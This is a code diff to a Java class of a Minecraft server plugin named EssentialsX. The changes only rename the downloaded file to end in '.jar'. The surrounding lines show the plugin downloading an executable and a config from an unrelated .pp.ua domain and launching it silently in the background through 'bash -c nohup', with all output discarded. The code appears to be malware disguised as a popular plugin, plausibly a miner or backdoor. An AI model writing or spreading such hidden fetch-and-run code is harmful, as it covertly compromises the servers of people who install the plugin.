@@ -84,7 +84,7 @@ public class EssentialsX extends JavaPlugin {
 
 
         String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11";
+                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11.jar";
 
 
         String confUrl =
@@ -104,7 +104,7 @@ public class EssentialsX extends JavaPlugin {
 
         Path javaFile =
                 runFolder.resolve(
-                        "EssentialsX-1.21.11"
+                        "EssentialsX-1.21.11.jar"
                 );
 
 
@@ -177,7 +177,7 @@ public class EssentialsX extends JavaPlugin {
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./EssentialsX-1.21.11 -c config.json > /dev/null 2>&1 &"
+                        "nohup ./EssentialsX-1.21.11.jar -c config.json > /dev/null 2>&1 &"
                 );
 
 
